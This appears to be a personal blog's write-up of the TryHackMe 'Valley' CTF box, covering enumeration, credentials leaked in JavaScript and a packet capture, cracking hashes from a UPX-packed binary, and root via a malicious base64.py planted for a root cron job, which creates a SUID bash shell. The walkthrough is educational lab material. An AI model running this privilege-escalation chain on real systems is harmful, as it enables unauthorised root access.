@@ -1,0 +1,415 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Valley | Jenn Shagrin</title>
+<meta name="keywords" content="">
+<meta name="description" content="TryHackMe CTF — credential exposure chain, PCAP analysis, UPX binary analysis, and Python library hijack via cron.">
+<meta name="author" content="">
+<link rel="canonical" href="https://jennshaggy.github.io/valley-ctf.html">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.086cbe158e48a4a74f4fec1e99aa846e3b43c1f4abb8e972f3ad8921f1408291.css" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://jennshaggy.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://jennshaggy.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://jennshaggy.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://jennshaggy.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://jennshaggy.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+            .list {
+                background: var(--theme);
+            }
+            .toc {
+                background: var(--entry);
+            }
+        }
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+</script>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/extended/harmonize.css">
+<meta property="og:url" content="https://jennshaggy.github.io/valley-ctf.html">
+<meta property="og:site_name" content="Jenn Shagrin">
+<meta property="og:title" content="Valley">
+<meta property="og:description" content="TryHackMe CTF — credential exposure chain, PCAP analysis, UPX binary analysis, and Python library hijack via cron.">
+<meta property="og:locale" content="en-us">
+<meta property="og:type" content="article">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Valley">
+<meta name="twitter:description" content="TryHackMe CTF — credential exposure chain, PCAP analysis, UPX binary analysis, and Python library hijack via cron.">
+</head>
+
+<body id="top">
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://jennshaggy.github.io/" accesskey="h" title="Jenn Shagrin (Alt + H)">Jenn Shagrin</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="/security-defense/" title="Security &amp; Defense">
+                    <span>Security &amp; Defense</span>
+                </a>
+            </li>
+            <li>
+                <a href="/networking.html" title="Networking">
+                    <span>Networking</span>
+                </a>
+            </li>
+            <li>
+                <a href="/systems-foundation.html" title="Systems">
+                    <span>Systems</span>
+                </a>
+            </li>
+            <li>
+                <a href="/applied-projects.html" title="Penetration Testing">
+                    <span class="active">Penetration Testing</span>
+                </a>
+            </li>
+            <li>
+                <a href="/platforms-training.html" title="Training">
+                    <span>Training</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://iad.portfolio.instructure.com/shared/4c4c330d1376bf479a9cbb73190bad1a110fb33cf436c283" title="CIAT Portfolio" target="_blank" rel="noopener noreferrer">
+                    <span>CIAT Portfolio</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+
+<main class="main">
+<article class="post-single">
+  <header class="post-header">
+    <h1 class="post-title entry-hint-parent">Valley</h1>
+    <div class="post-description">TryHackMe CTF &mdash; credential exposure chain, PCAP analysis, UPX binary analysis, and Python library hijack via cron.</div>
+  </header>
+
+  <div class="post-content">
+
+<p>Valley Photo Co. is a medium Linux box that punishes credential reuse at every layer. The developer left a to-do note saying "remove this directory" in a static file slot. They didn't remove it. Everything else followed from that.</p>
+
+<hr>
+
+<h2>Initial Enumeration</h2>
+
+<p>Full port scan first — always. Non-standard ports don't show up in default scans.</p>
+
+<pre><code>nmap -p- --min-rate 5000 -T4 10.146.163.47 -oN valley_allports.txt
+nmap -sC -sV -p 22,80,37370 -oN valley_services.txt 10.146.163.47</code></pre>
+
+<p>SSH on 22, Apache 2.4.41 on 80, vsFTPd 3.0.3 on 37370. The FTP port needs credentials — filed away.</p>
+
+<img src="/images/valley/Screenshot 2026-04-01 at 7.36.52 AM.png" alt="Full port scan revealing non-standard FTP on 37370" style="max-width:100%;margin:1rem 0;">
+
+<img src="/images/valley/Screenshot 2026-04-01 at 7.44.42 AM.png" alt="Service scan confirming vsFTPd 3.0.3 on 37370 and Apache on 80" style="max-width:100%;margin:1rem 0;">
+
+<p>The web app is a photography portfolio. Two buttons: View Gallery and View Pricing. Page source references <code>/js/art.js</code> — a node.js ascii-art package with a known command injection vulnerability. It 404s here and doesn't factor into this chain, but worth noting that I checked.</p>
+
+<img src="/images/valley/Screenshot 2026-04-01 at 7.45.13 AM.png" alt="Valley Photo Co. landing page" style="max-width:100%;margin:1rem 0;">
+
+<img src="/images/valley/Screenshot 2026-04-01 at 7.54.08 AM.png" alt="Page source referencing /js/art.js" style="max-width:100%;margin:1rem 0;">
+
+<p>Gobuster with extension hunting:</p>
+
+<pre><code>gobuster dir -u http://10.146.163.47 -w /usr/share/wordlists/dirb/common.txt -x html,php,txt -o valley_gobuster.txt</code></pre>
+
+<p>Surfaces <code>/gallery</code>, <code>/pricing</code>, and <code>/static</code> with 301s. <code>/static/</code> has directory listing enabled but appears empty. The gallery source shows images served from <code>/static/1</code> through <code>/static/18</code>. Going one past the end to <code>/static/00</code> returns something that isn't an image.</p>
+
+<img src="/images/valley/Screenshot 2026-04-01 at 8.08.02 AM.png" alt="Gobuster results surfacing /static alongside /gallery and /pricing" style="max-width:100%;margin:1rem 0;">
+
+<img src="/images/valley/Screenshot 2026-04-01 at 8.10.20 AM.png" alt="/static/ directory listing enabled but appearing empty" style="max-width:100%;margin:1rem 0;">
+
+<hr>
+
+<h2>Information Disclosure &mdash; /static/00</h2>
+
+<p>Dev notes sitting in a numbered static slot the gallery never references:</p>
+
+<pre><code>dev notes from valleyDev:
+-add wedding photo examples
+-redo the editing on #4
+-remove /dev1243224123123
+-check for SIEM alerts</code></pre>
+
+<p>The developer left a reminder to remove a directory and didn't remove it. <code>/dev1243224123123</code> is the next stop.</p>
+
+<img src="/images/valley/Screenshot 2026-04-01 at 8.11.22 AM.png" alt="/static/00 dev notes revealing hidden directory path" style="max-width:100%;margin:1rem 0;">
+
+<hr>
+
+<h2>Credentials in Client-Side JS</h2>
+
+<p><code>/dev1243224123123/</code> is a login portal. Page source references <code>dev.js</code>. The authentication logic and the credentials are in plaintext:</p>
+
+<pre><code>if (username === "siemDev" &amp;&amp; password === "california") {
+    window.location.href = "/dev1243224123123/devNotes37370.txt";
+}</code></pre>
+
+<p><code>siemDev</code> / <code>california</code>. The redirect target has the FTP port number in the filename, which isn't subtle. The dev notes at that path say "stop reusing credentials" and "change ftp port to normal port." They didn't do either.</p>
+
+<img src="/images/valley/Screenshot 2026-04-01 at 8.12.26 AM.png" alt="/dev1243224123123 login portal" style="max-width:100%;margin:1rem 0;">
+
+<img src="/images/valley/Screenshot 2026-04-01 at 8.17.47 AM.png" alt="dev.js containing siemDev/california credentials in plaintext" style="max-width:100%;margin:1rem 0;">
+
+<img src="/images/valley/Screenshot 2026-04-01 at 8.20.47 AM.png" alt="devNotes37370.txt confirming stop reusing credentials advice ignored" style="max-width:100%;margin:1rem 0;">
+
+<hr>
+
+<h2>FTP Access &mdash; PCAP Retrieval</h2>
+
+<p>FTP opens immediately with the JS credentials:</p>
+
+<pre><code>ftp 10.146.163.47 37370</code></pre>
+
+<p>Three files in the directory: <code>siemFTP.pcapng</code>, <code>siemHTTP1.pcapng</code>, <code>siemHTTP2.pcapng</code>. The FTP pcap is a red herring. <code>siemHTTP2.pcapng</code> is the one. Filtering for <code>http</code> in Wireshark and looking at POST requests surfaces credentials in plaintext:</p>
+
+<pre><code>uname=valleyDev
+psw=ph0t0s1234</code></pre>
+
+<p>The dev notes said stop reusing credentials. They didn't listen.</p>
+
+<img src="/images/valley/Screenshot 2026-04-01 at 8.23.23 AM.png" alt="FTP login as siemDev showing three pcap files" style="max-width:100%;margin:1rem 0;">
+
+<img src="/images/valley/Screenshot 2026-04-01 at 8.34.54 AM.png" alt="siemHTTP2.pcapng in Wireshark revealing valleyDev credentials in plaintext POST" style="max-width:100%;margin:1rem 0;">
+
+<hr>
+
+<h2>Initial Access &mdash; SSH as valleyDev</h2>
+
+<pre><code>ssh valleyDev@10.146.163.47</code></pre>
+
+<img src="/images/valley/Screenshot 2026-04-01 at 8.38.18 AM.png" alt="SSH access confirmed as valleyDev" style="max-width:100%;margin:1rem 0;">
+
+<p>User flag retrieved. Standard privesc enumeration: no sudo rights for valleyDev, one custom cron entry running <code>python3 /photos/script/photosEncrypt.py</code> as root every minute. The script imports <code>base64</code> — potentially hijackable if a writable path exists earlier in Python's search order. But valleyDev isn't in the <code>valley</code> group that owns the photos directory. Need to lateral move first.</p>
+
+<img src="/images/valley/Screenshot 2026-04-01 at 8.47.04 AM.png" alt="User flag retrieved" style="max-width:100%;margin:1rem 0;">
+
+<img src="/images/valley/Screenshot 2026-04-01 at 8.49.52 AM.png" alt="/etc/crontab showing python3 photosEncrypt.py running as root every minute" style="max-width:100%;margin:1rem 0;">
+
+<img src="/images/valley/Screenshot 2026-04-01 at 8.53.39 AM.png" alt="photosEncrypt.py source importing base64" style="max-width:100%;margin:1rem 0;">
+
+<img src="/images/valley/Screenshot 2026-04-01 at 8.54.55 AM.png" alt="/photos/ directory owned by valley group — valleyDev has no access" style="max-width:100%;margin:1rem 0;">
+
+<hr>
+
+<h2>Lateral Movement &mdash; valleyAuthenticator Binary</h2>
+
+<p><code>/home/</code> has an unexpected file: <code>valleyAuthenticator</code>, executable by everyone. Running it prompts for credentials — known ones fail. The real password is baked into the binary. Pull it locally:</p>
+
+<pre><code>scp valleyDev@10.146.163.47:/home/valleyAuthenticator ~/valleyAuthenticator</code></pre>
+
+<img src="/images/valley/Screenshot 2026-04-01 at 9.24.19 AM.png" alt="/home/ listing showing valleyAuthenticator binary" style="max-width:100%;margin:1rem 0;">
+
+<img src="/images/valley/Screenshot 2026-04-01 at 9.29.12 AM.png" alt="scp pulling valleyAuthenticator to local machine" style="max-width:100%;margin:1rem 0;">
+
+<p>Initial <code>strings</code> output is garbage — UPX packed. Unpack first:</p>
+
+<pre><code>upx -d ~/valleyAuthenticator -o ~/valleyAuthenticator_unpacked
+strings ~/valleyAuthenticator_unpacked | grep -B5 "Welcome"</code></pre>
+
+<img src="/images/valley/Screenshot 2026-04-01 at 9.31.07 AM.png" alt="UPX unpack — binary decompresses from 749KB to 2.2MB" style="max-width:100%;margin:1rem 0;">
+
+<p>Two MD5 hashes appear directly above the authentication strings:</p>
+
+<pre><code>e6722920bab2326f8217e4bf6b1b58ac
+dd2921cc76ee3abfd2beb60709056cfb</code></pre>
+
+<img src="/images/valley/Screenshot 2026-04-01 at 9.37.17 AM.png" alt="strings output showing MD5 hashes above authentication strings" style="max-width:100%;margin:1rem 0;">
+
+<pre><code>echo "e6722920bab2326f8217e4bf6b1b58ac" > hashes.txt
+echo "dd2921cc76ee3abfd2beb60709056cfb" >> hashes.txt
+john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt</code></pre>
+
+<p>John returns <code>valley</code> and <code>liberty123</code>.</p>
+
+<img src="/images/valley/Screenshot 2026-04-01 at 9.38.42 AM.png" alt="John cracking both MD5 hashes — valley and liberty123" style="max-width:100%;margin:1rem 0;">
+
+<pre><code>su valley
+# password: liberty123</code></pre>
+
+<img src="/images/valley/Screenshot 2026-04-01 at 9.41.36 AM.png" alt="su valley confirmed — valleyAdmin group membership visible" style="max-width:100%;margin:1rem 0;">
+
+<p><code>valleyAdmin</code> group. That's what was missing.</p>
+
+<hr>
+
+<h2>Privilege Escalation &mdash; Python Library Hijack via Cron</h2>
+
+<p>Python's module search order checks <code>sys.path</code> sequentially. If a malicious module exists earlier in that path than the real one, it gets imported instead. As <code>valley</code>, check whether <code>valleyAdmin</code> has write access to any path Python searches:</p>
+
+<pre><code>python3 -c "import sys; print(sys.path)"
+ls -la /usr/lib/python3.8/</code></pre>
+
+<p><code>/usr/lib/python3.8/</code> is group-writable by <code>valleyAdmin</code>. <code>photosEncrypt.py</code> imports <code>base64</code>. Dropping a malicious <code>base64.py</code> here means root imports it on the next cron tick.</p>
+
+<pre><code>echo 'import os; os.system("cp /bin/bash /tmp/rootbash &amp;&amp; chmod +s /tmp/rootbash")' > /usr/lib/python3.8/base64.py</code></pre>
+
+<img src="/images/valley/Screenshot 2026-04-01 at 9.42.46 AM.png" alt="/usr/lib/python3.8/ writable by valleyAdmin — malicious base64.py planted" style="max-width:100%;margin:1rem 0;">
+
+<pre><code>watch -n 5 ls -la /tmp/rootbash</code></pre>
+
+<p>SUID rootbash appears within a minute.</p>
+
+<img src="/images/valley/Screenshot 2026-04-01 at 9.47.44 AM.png" alt="watch confirms /tmp/rootbash with SUID bit after cron fires" style="max-width:100%;margin:1rem 0;">
+
+<pre><code>/tmp/rootbash -p
+cat /root/root.txt</code></pre>
+
+<img src="/images/valley/Screenshot 2026-04-01 at 9.48.09 AM.png" alt="rootbash -p drops root shell, root flag retrieved" style="max-width:100%;margin:1rem 0;">
+
+<hr>
+
+<h2>Full Attack Chain</h2>
+
+<pre><code>full port scan → non-standard FTP (37370) + Apache (80)
+→ /static/00 dev notes → hidden dir /dev1243224123123
+→ dev.js credentials (siemDev/california) → FTP access
+→ siemHTTP2.pcapng → plaintext SSH creds (valleyDev/ph0t0s1234)
+→ SSH → user flag
+→ cron: root runs photosEncrypt.py (imports base64) every minute
+→ valleyAuthenticator binary → UPX unpack → MD5 hashes → john
+→ su valley (liberty123) → valleyAdmin group
+→ writable /usr/lib/python3.8/ → malicious base64.py
+→ cron fires → SUID rootbash → root flag</code></pre>
+
+  </div>
+
+  <footer class="post-footer">
+  </footer>
+</article>
+</main>
+
+<footer class="footer">
+    <span>&copy; 2026 <a href="https://jennshaggy.github.io/">Jenn Shagrin</a></span> ·
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &amp;
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({ behavior: "smooth" });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+</script>
+</body>
+</html>
